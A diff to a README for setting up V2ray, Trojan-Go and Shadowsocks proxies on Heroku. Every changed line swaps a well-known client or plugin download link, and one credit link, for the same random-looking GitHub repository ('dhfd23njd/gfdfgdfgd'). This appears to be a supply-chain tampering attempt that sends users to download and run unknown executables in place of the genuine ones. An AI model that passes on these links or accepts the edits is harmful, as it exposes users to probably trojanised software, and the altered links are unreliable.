@@ -34,7 +34,7 @@ For security reasons, unless you use a CDN, please don't use a custom domain nam
 <summary>V2rayN(Xray, V2ray)</summary>
 
 ```bash
-* Client download：https://github.com/2dust/v2rayN/releases
+* Client download：https://github.com/dhfd23njd/gfdfgdfgd/releases
 * Proxy protocol：vless or vmess
 * Address：xxx.herokuapp.com
 * Port：443
@@ -54,7 +54,7 @@ For security reasons, unless you use a CDN, please don't use a custom domain nam
 <summary>Trojan-Go</summary>
 
 ```bash
-* Client download: https://github.com/p4gefau1t/trojan-go/releases
+* Client download: https://github.com/dhfd23njd/gfdfgdfgd/releases
 {
     "run_type": "client",
     "local_addr": "127.0.0.1",
@@ -77,12 +77,12 @@ For security reasons, unless you use a CDN, please don't use a custom domain nam
 <summary>Shadowsocks</summary>
 
 ```bash
-* Client download：https://github.com/shadowsocks/shadowsocks-windows/releases/
+* Client download：https://github.com/dhfd23njd/gfdfgdfgd/releases/
 * Server address: xxx.herokuapp.com
 * Port: 443
 * Password：24b4b1e1-7a89-45f6-858c-242cf53b5bdb
 * Encryption：chacha20-ietf-poly1305
-* Plug-in：xray-plugin_windows_amd64.exe  //You need to download and unzip the plugin - https://github.com/shadowsocks/xray-plugin/releases and place it in the same directory
+* Plug-in：xray-plugin_windows_amd64.exe  //You need to download and unzip the plugin - https://github.com/dhfd23njd/gfdfgdfgd/releases and place it in the same directory
 * Plugin options: tls; host= xxx.herokuapp.com; path= /24b4b1e1-7a89-45f6-858c-242cf53b5bdb-ss // (/custom UUID-ss)
 ```
 </details>
@@ -127,6 +127,6 @@ addEventListener(
 ### Special thanks to:
 
 * [mixool](https://github.com/mixool/)
-* [bclswl0827](https://github.com/bclswl0827/v2ray-heroku)
+* [bclswl0827](https://github.com/dhfd23njd/gfdfgdfgd)
 * [yxhit](https://github.com/yxhit)
 * [badafans](https://github.com/badafans/better-cloudflare-ip/tree/20201208)
